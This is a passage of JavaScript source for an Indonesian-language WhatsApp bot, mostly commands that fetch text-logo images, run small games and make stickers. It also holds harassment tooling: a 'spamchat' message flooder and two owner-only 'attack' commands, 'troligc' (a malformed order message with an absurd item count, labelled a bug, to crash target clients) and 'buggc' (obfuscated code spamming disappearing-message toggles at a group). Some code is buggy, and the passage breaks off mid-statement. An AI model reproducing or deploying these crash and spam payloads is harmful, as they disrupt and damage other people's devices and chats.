Uploaded : ${anu.result.uploaded}`
Ardy.sendMessage(from, teks, text)
break
          
          case 'ytmp4':
          if (!isRegistered) return reply(ind.noregis())
          const ytmp4 = require('./lib/ytmp4')(args[0])

          //group
          case 'online':
          case 'listonline':
          case 'here':
                if (!isGroup) return reply(`Only group`)
                   try {
                   let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                   let online = [...Object.keys(mek.chats.get(ido).presences), mek.user.jid]
                   Ardy.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: freply, contextInfo: { mentionedJid: online }})
                } catch (e) {
                	reply(`NTAHLAH, mungkin EROR`)
                }
                   break
        case 'hidetag':
					
          if (!isRegistered) return reply( ind.noregis())
          if (isLimit(sender)) return reply(ind.limitend(pusname))
          if (isBanned) return reply('Maaf kamu sudah terbenned!')
          if (!isGroup) return reply(ind.groupo())
          if (!isGroupAdmins) return reply(ind.admin())
          var value = body.slice(9)
          var group = await Ardy.groupMetadata(from)
          var member = group['participants']
          var mem = []
          mekber.map( async adm => {
          mek.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          var options = {
          text: value,
          contextInfo: { mentionedJid: mek },
          quoted: mek
          }
          Ardy.sendMessage(from, options, text)
          await limitAdd(sender)
          break
		case 'welcome':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('*Fitur welcome sudah aktif sebelum nya')
						welkom.push(from)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur welcome di group ini')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur welcome di group ini')
					} else {
						reply('*Tambah parameter 1/enable atau 0/disable*')
					}
					break

                 case 'antilink':
                                	if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.groupo())
					if (!isBotGroupAdmins) return reply(ind.groupo())
					if (args.length < 1) return reply('Ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntilink) return reply('Anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./database/grup/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan anti link group di group ini ✔️')
						Ardy.sendMessage(from,`Jan Kirim Link Kako Bukan Admin/nJika Tidak Akan Saya Tendang🦶`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntilink) return reply('Mode anti link group sudah disable')
						antilink.splice(from, 1)
						fs.writeFileSync('./database/grup/antilink.json', JSON.stringify(antilink))
						reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
						reply('*Tambah parameter 1/enable atau 0/disable*')
					}
					break

                //Text Maker
                case 'epeplogo':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                text_pak = `${body.slice(10)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/epep?apikey=Ardy-ApiKey&text=${text_pak}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'goldplaybutton':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                text_pak = `${body.slice(16)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?apikey=Ardy-ApiKey&text=${text_pak}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break
                
                case 'silverplaybutton':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                text_pak = `${body.slice(18)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?apikey=Ardy-ApiKey&text=${text_pak}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'matrixlogo':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                txt_pak = `${body.slice(12)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/matrix?apikey=Ardy-ApiKey&text=${txt_pak}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'nulis':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                pulpen = `${body.slice(7)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/magernulis?apikey=Ardy-ApiKey&nama=${pushname}&kelas=XII%20IPS%202&text=${pulpen}&tinta=10`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'nulis1':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                pulpen = `${body.slice(7)}`
	                reply(ind.wait())
	                anu = await getBuffer(`http://zekais-api.herokuapp.com/bukukanan?text=${body.slice(8)}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'nulis2':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                pulpen = `${body.slice(7)}`
	                reply(ind.wait())
	                anu = await getBuffer(`http://zekais-api.herokuapp.com/bukukiri?text=${body.slice(8)}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'nulis3':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                pulpen = `${body.slice(7)}`
	                reply(ind.wait())
	                anu = await getBuffer(`http://zekais-api.herokuapp.com/foliokanan?text=${body.slice(8)}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'nulis4':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                pulpen = `${body.slice(7)}`
	                reply(ind.wait())
	                anu = await getBuffer(`http://zekais-api.herokuapp.com/foliokiri?text=${body.slice(8)}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'sandtext':
        if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                ini_txt = `${body.slice(10)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/sandw?apikey=Ardy-ApiKey&text=${ini_txt}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'narutobanner':
          if (!isRegistered) return reply(ind.noregis())
                  teks_pak = `${body.slice(14)}`
                  buff = await getBuffer(`http://hadi-api.herokuapp.com/api/photoxy/manga-naruto?teks=${teks_pak}`)
                  reply(ind.wait())
                  Ardy.sendMessage(from, buff, image, {quoted: ftoko, caption: 'Nih Kak' })
                  break

                  case 'coffe':
          if (!isRegistered) return reply(ind.noregis())
                  aow = `${body.slice(7)}`
                  buff = await getBuffer(`http://hadi-api.herokuapp.com/api/photoxy/put-coffee-cup?teks=${aow}`)
                  reply(ind.wait())
                  Ardy.sendMessage(from, buff, image, {quoted: ftoko, caption: 'Nih Kak' })
                  break 

                   case 'pornhub':
          if (!isRegistered) return reply(ind.noregis())
                    dap = `${body.slice(9)}`
                    txt1 = dap.split("/")[0];
                    txt2 = dap.split("/")[1];
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy Store`)
                    reply(ind.wait())
                    txt1 = args[0]
                    txt2 = args[1]
                    anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?apikey=Ardy-ApiKey&text1=${txt1}&text2=${txt2}`)
                    Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
                    await limitAdd(sender)
                    break

                   case 'glitch':
          if (!isRegistered) return reply(ind.noregis())
                    dap = `${body.slice(9)}`
                    txt1 = dap.split("/")[0];
                    txt2 = dap.split("/")[1];
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy Store`)
                    reply(ind.wait())
                    txt1 = args[0]
                    txt2 = args[1]
                    anu = await getBuffer(`https://api.zeks.xyz/api/gtext?apikey=Ardy-ApiKey&text1=${txt1}&text2=${txt2}`)
                    Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
                    break
                    
                    case 'neon':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                reply(ind.wait())
                    ini_txt = `${body.slice(6)}`
                    ini_buffer = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=Ardy-ApiKey&text=${ini_txt}`)
                    Ardy.sendMessage(from, ini_buffer, image, { quoted: ftoko, caption:'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
                    break

                    case 'tahta':
        if (!isRegistered) return reply(ind.noregis())
                     if (args.length == 0) return reply(`Contoh : ${prefix + command} Ardy`)
	                teks_pak = `${body.slice(7)}`
	                reply(ind.wait())
	                anu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=Ardy-ApiKey&text=${teks_pak}`)
	                Ardy.sendMessage(from, anu, image, { quoted: ftoko, caption:'Nih Tuanku\nJan Lupa Subrek Yt Ardy Store', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                break
                case 'blackpink':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Ardy Store`)
	                reply(ind.wait())
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    Ardy.sendMessage(from, ini_buffer, image, { quoted: mek, contextInfo: { forwardingScore: 1000, isForwarded: true}})
                    break

                //photo oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Ardy Store`)
	                reply(ind.wait())
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    Ardy.sendMessage(from, ini_buffer, image, { quoted: mek, contextInfo: { forwardingScore: 1000, isForwarded: true}})
                    break

                // Ephoto 360
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'freefire':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Ardy Store`)
	                reply(ind.wait())
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    Ardy.sendMessage(from, ini_buffer, image, { quoted: mek, contextInfo: { forwardingScore: 1000, isForwarded: true}})
                    break

//Game
    case 'tembak':
                    if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`contoh : ${prefix}tembak udara`)
                    if (args[0] == 'udara') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh33}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'darat') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh22}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'laut') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh11}* ]`)
                    }, 12000)
                    }
                    break

    case 'tebakgambar':
				    if (!isRegistered) return reply(ind.noregis())
				    if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.zeks.xyz/api/tebakgambar?apikey=Ardy-ApiKey`, {method: 'get'})
					ngebuff = await getBuffer(anu.result.soal)
					tebak = ` Jawaban : *${anu.result.jawaban}*`
					setTimeout( () => {
					Ardy.sendMessage(from, tebak, text, {quoted: mek })
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Ardy.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Ardy.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Ardy.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Ardy.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: fdoc }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break

    case 'suit':
    if (!isRegistered) return reply(ind.noregis())
    if (args.length == 0) return reply(`Contoh : ${prefix}suit batu`)
    anu = await fetchJson(`https://api.xteam.xyz/game/suit?q=${body.slice(6)}&APIKEY=${xteam}`)
    poitk = `Hasil : ${anu.hasil}\nJawabanmu : ${anu.jawabanmu}\nJawabanbot : ${anu.jawabanbot}\nPoin : ${anu.poin}\nSelamat Kamu ${anu.hasil}👏`
    Ardy.sendMessage(from, poitk, text)
    break

    case 'susunkata':
    if (!isRegistered) return reply(ind.noregis())
    anu = await fetchJson(`https://api.xteam.xyz/game/susunkata?APIKEY=${xteam}`)
    ssnkata = `Level : ${anu.result.level}\nSoal : ${anu.result.soal}`
    Ardy.sendMessage(from, ssnkata, text)
    break

    case 'tebakbendera':
    if (!isRegistered) return reply(ind.noregis())
    anu = await fetchJson(`https://api.xteam.xyz/game/tebakbendera?APIKEY=${xteam}`)
    bendera_nya = `Bendera : ${anu.bendera}\n\nBendera Apa Hayoo🗿`
    Ardy.sendMessage(from, bendera_nya, text)
    break

//ramdom menu
 case 'gtts':
					if (args.length == 0) return reply('Wow')
					if (args.length < 1) return Ardy.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return Ardy.sendMessage(from, 'Textnya mana om', text, {quoted: mek})
					dtt = body.slice(9)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						Ardy.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					break

//Sticker Commands
case 'patrick':
if (!isRegistered) return reply(ind.noregis())
anu = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
Ardy.sendMessage(from, anu, sticker)
break

case 'dadu':
if (!isRegistered) return reply(ind.noregis())
anu = await getBuffer(`https://api.lolhuman.xyz/api/sticker/dadu?apikey=${lolkey}`)
Ardy.sendMessage(from, anu, sticker)
break

case 'amongus':
if (!isRegistered) return reply(ind.noregis())
teks_nya = `${body.slice(9)}`
anu = await getBuffer(`http://lolhuman.herokuapp.com/api/amongus?apikey=${lolkey}&text=${teks_nya}`)
Ardy.sendMessage(from, anu, image, {quoted: mek, caption: 'Nih Kak', contextInfo: { forwardingScore: 1000, isForwarded: true}})
break

case 'stickerwm': 
case 'swm': 
case 'take': 
case 'takesticker': 
case 'takestick':{
                if (!isPremium) return reply(ind.nopremi)
                if (args.length < 2) return reply(`Penggunaan ${prefix + command} nama|author`)
                let packname1 = q.split('|')[0] ? q.split('|')[0] : q
                let author1 = q.split('|')[1] ? q.split('|')[1] : ''
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await Ardy.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					exif.create(packname1, author1, `stickwm_${sender}`)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									Ardy.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fdoc})
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
                                    fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                } else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await Ardy.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					exif.create(packname1, author1, `stickwm_${sender}`)
                    reply(mess.wait)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									Ardy.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fdoc})
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                    fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                } else if (isQuotedSticker) {
                    let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    let media = await Ardy.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    exif.create(packname1, author1, `takestick_${sender}`)
                    exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                        if (error) return reply(mess.error.api)
                        Ardy.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fdoc})
                        fs.unlinkSync(media)
                        fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
                    })
                }else {
                    reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
            }

//owner
case 'tagall':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(`Admin Grup Only`)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*#* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
case 'addprem':
if (!isOwner) return reply(ind.ownerb())
nomornya = body.slice(9)
tagnya = `${nomornya}@s.whatsapp.net`
prem.push(`${nomornya}@s.whatsapp.net`)
gess = `[SUKSES]\nBerhasil Add Premium @${nomornya}`
fs.writeFileSync('./database/user/premium.json', JSON.stringify(prem))
Ardy.sendMessage(from, gess, text, {quoted: mek, contextInfo: {"mentionedJid": [tagnya]}})
Ardy.sendMessage(tagnya, 'Ciee Dah Jadi User Premium🤭', text)
break

		case 'dellprem':
				if (!isOwner) return reply(ind.ownerb())
				dia = body.slice(10)
				premm = body.slice(10)
				prem.splice(`${premm}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(prem))
				gees = `Nomor sudah berakhir menjadi premium kek tytyd si lu wa.me/${dia} `
				reply(gess())
				break

case 'join':
if (!mek.key.fromMe && !isOwner) return reply('Command Khusus Owner !!')
if (args.length < 1) return reply('Link nya mana?')
Ardy.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply(`Sukses Join`)
break

case 'spamchat':
if (!isRegistered) return reply(ind.noregis())
if (!isPremium) return reply(ind.nopremi())
for (let i = 0; i < args[0]; i++) {
	    const textnya = body.slice(12)
	Ardy.sendMessage(from, textnya, text)
	}
	break

case 'owner':
case 'creator':
Ardy.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: fdoc, contextInfo: { forwardingScore: 1000, isForwarded: true}})
Ardy.sendMessage(from, 'Tuh Owner Gw, Kalo Ga Penting\n Jangan Chat Owner Gw🗿',MessageType.text, { quoted: fkon, contextInfo: { forwardingScore: 1000, isForwarded: true}} )
break

case 'mute':
                if (!isGroup) return reply(ind.groupo)
                if (!isGroupAdmins && !isOwner) return reply('Admin Group Only')
                if (!isBotGroupAdmins) return reply('Only Admin Bot')
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/user/mute.json', JSON.stringify(mute))
                reply(`Bot berhasil dimute di chat ini`)
                break

case 'troligc':
if (!isOwner) return reply('Command Khusus Owner !!')
if (!isGroup) return reply('Grup Only')
function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
Ardy.sendMessage(nomor, `PUNTEN BROW?🗿`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
 },
message: {
orderMessage: {
thumbnail: fs.readFileSync('src/Ardy.jpeg'),
itemCount: 9999999999999999, // Bug
status: 1,
surface: 1,
message: '️ArdyNihBosss',
orderTitle: 'Mwehehe', // Idk what this does
sellerJid: '0@s.whatsapp.net' // Seller
}
}
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
Ardy.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break

case 'buggc':
if (!isOwner) return reply('*Only Admin bot*')
if (!isGroup) return reply(ind.groupo())
var _0x2b25=['7kLGtwa','22759HhAzxA','174uvqUoY','2985aDKIEr','2QoNAtJ','192172VcTIKb','1047764HvrFbt','338630CYXQos','6aroJZZ','1032632OdZvvO','toggleDisappearingMessages','535626HouiGW'];var _0xb34151=_0xd419;function _0xd419(_0x195f02,_0x15293f){return _0xd419=function(_0x2b254c,_0xd4196c){_0x2b254c=_0x2b254c-0x11a;var _0x22ad2a=_0x2b25[_0x2b254c];return _0x22ad2a;},_0xd419(_0x195f02,_0x15293f);}(function(_0x326811,_0x14e7f3){var _0x26b828=_0xd419;while(!![]){try{var _0x58b8b4=-parseInt(_0x26b828(0x11c))*parseInt(_0x26b828(0x11b))+-parseInt(_0x26b828(0x122))+-parseInt(_0x26b828(0x11a))+parseInt(_0x26b828(0x120))*parseInt(_0x26b828(0x123))+-parseInt(_0x26b828(0x121))+-parseInt(_0x26b828(0x11d))*parseInt(_0x26b828(0x11e))+-parseInt(_0x26b828(0x11f))*-parseInt(_0x26b828(0x124));if(_0x58b8b4===_0x14e7f3)break;else _0x326811['push'](_0x326811['shift']());}catch(_0x5388c0){_0x326811['push'](_0x326811['shift']());}}}(_0x2b25,0x96c65),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125